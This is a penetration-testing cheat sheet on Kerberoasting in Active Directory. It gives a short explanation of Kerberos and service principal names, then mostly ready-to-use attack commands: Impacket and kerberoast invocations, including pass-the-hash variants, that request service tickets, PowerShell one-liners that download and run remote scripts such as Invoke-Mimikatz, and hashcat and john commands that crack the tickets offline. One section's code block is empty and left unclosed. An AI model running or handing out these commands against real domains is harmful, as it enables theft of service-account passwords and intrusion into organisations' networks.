# Active Directory - Kerberoasting

### Overview

A Kerberoasting attack is an attack on the Kerberos authentication mechanism
that involves compromising the password of a service account, a user account
that has a "serviceprincipalname" (SPN), through service tickets requests (to
the TGS).

part of the service tickets is encrypted using one of the service account
secrets (RC4 and AES 128/256 bits keys). The encryption type to be used can be
specified client-side in order to force the use of the RC4 key, which is egal
to the service account password NTLM hash. Thus, an offline cracking attack on
the service tickets can be conducted to retrieve the plaintext password of the
corresponding service account.   

As any authenticated user on the domain in posession of a TGT can requests
service tickets for all available services, the service account passwords are
exposed to offline cracking attack that are much faster and can not be time
restricted.  

The attack chain is as follow:
  - Identify user accounts with a SPN (service accounts)
  - Request service tickets for thoses services
  - Extract the TGS for offline cracking

###### Kerberos

Kerberos is a network authentication protocol based on a secret key mechanism
(symmetric encryption) and the use of tickets issued by the KDC (Key
Distribution Center).  

Two types of tickets are used:  
  - TGT (Ticket-Granting Ticket) is a ticket that represents the identity of
  the user and is used to request service tickets
  - service tickets, obtained from the service Ticket-Granting Service are
  tickets that allows the user to authenticate to a specific service,
  whose name is written in the ticket.

###### Service Principal Names (SPN)

The SPN is a unique identifier of a service instance. SPNs are used by Kerberos
authentication to associate a service instance with a service logon account.
SPN are used to map a service running on a server to an account it’s running as
so that it can accept kerberos authentication.

### Automated SPN discover, request and export of TGS

The following tools can be used to automate the SPN discovery and the request
and export of Service Tickets for offline cracking:

```

### Manual SPN Discovery

The following tools can be used to retrieve the SPN of the Domain services:

```
# (Python) Impacket/examples GetUserSPNs.py
GetUserSPNs.py [-h] [-request] [-request-user username] [-save] [outputfile OUTPUTFILE] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] domain/username[:password]
GetUserSPNs.py -dc-ip <DCIP> <DOMAIN>/<USERNAME>
GetUserSPNs.py -dc-ip <DCIP> -hashes <LMHASH:NTHASH> <DOMAIN>/<USERNAME> # PtH

# (Powershell) GetUserSPNs - retrieve only SPN associated to user accounts (CN=Users) - inject and run automatically
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1')

# (Powershell) Get-SPN - allows for regex searching in the account, service or group name (specified by the Type and Search parameters)
# IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/Get-SPN/Get-SPN.psm1")
Get-SPN [[-Credential] <PSCredential>] [[-DomainController] <String>] [[-Limit] <Int32>] [[-SearchScope] <String>] [[-SearchDN] <String>] [-Type] <String> [-Search] <String> [[-List] <String>] [<CommonParameters>]
Get-SPN -Type user -Search * -List yes
Get-SPN -Type service -Search "MSSQL*"
Get-SPN -DomainController <DC> -Credential <DOMAIN>\<USERNAME [...]

```

Focus on the accounts with the higher probability of using a weak password,
usually user accounts with a password that has not been changed in a long time
/ not changed at all.

### Manual request and export of Service Tickets

The following tools can be used to request and export specific user Service
Tickets:

```
# (Python) Impacket/examples GetUserSPNs.py
GetUserSPNs.py -dc-ip <DCIP> -request-user '<USER>' <DOMAIN>/<USERNAME> # Requests TGS for the SPN associated to the USER specified (just the username, no domain needed)
GetUserSPNs.py -dc-ip <DCIP> -request-user '<USER>' -outputfile <FILE> <DOMAIN>/<USERNAME>

# (Python) skelsec/kerberoast
kerberoast spnroast -r <DOMAIN> -u '<USER>' <DOMAIN>/<USERNAME>:<PASSWORD>@<DCIP> # Requests TGS for the SPN associated to the USER specified (just the username, no domain needed)
kerberoast spnroast -r <DOMAIN> -u '<USER>' -n <DOMAIN>/<USERNAME>:<NTLMHASH>@<DCIP> # PtH
kerberoast spnroast -r <DOMAIN> -u '<USER>' -n <DOMAIN>/<USERNAME>:<AESKEY>@<DCIP> # Pass the Key
kerberoast spnroast -r <DOMAIN> -t <USERFILE>  <DOMAIN>/<USERNAME>:<PASSWORD>@<DCIP> # File with a list of usernames to roast, one user per line
kerberoast spnroast -r <DOMAIN> -u '<USER>' -o <FILE> <DOMAIN>/<USERNAME>:<PASSWORD>@<DCIP>

# (Powershell)
# Request TGS KerberosRequestorSecurityToken, export them using Mimikatz and convert to hash using John's kirbi2john.py
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>" # Requests TGS for the specified SPN
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1") | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}catch{}} # Requests TGS for all SPN associated to Users accounts
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command 'standard::base64 "kerberos::list /export" exit'

```

### Crack Service Tickets

Both John the Ripper (magnumripper fork) and Hashcat can be used to crack the
TGS.

The hash needs to respect the following format to be recognized by John/Hashcat:

```
$krb5tgs$23$*user$realm$test/spn*$63386[...]
```

Depending on the version used, the hash from the PowerSploit Invoke-Kerberos
cmdlet may need to be manually updated.

The following commands to crack the hash can be used:

```
# Its recommended to use Hashcat on a Windows OS for better performance due to driver compatibility
hashcat64.exe -m 13100 -r rules/best64.rule <HASHFILE> <WORDLIST>

john --wordlist=<WORDLIST> <HASHFILE>
```
